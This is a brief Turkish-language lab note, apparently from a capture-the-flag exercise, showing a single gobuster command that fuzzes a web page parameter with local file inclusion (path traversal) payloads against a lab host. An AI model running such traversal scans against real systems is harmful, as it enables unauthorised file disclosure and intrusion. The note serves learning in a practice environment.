*** Gobuster ile lfi (Path-traversal) ***
``` bash
gobuster -w /usr/share/wordlists/lfı/lfi.txt -u http://airplane.thm:8000/?page=../../../../../ dir -o lfi.txt --exclude-length 14
```


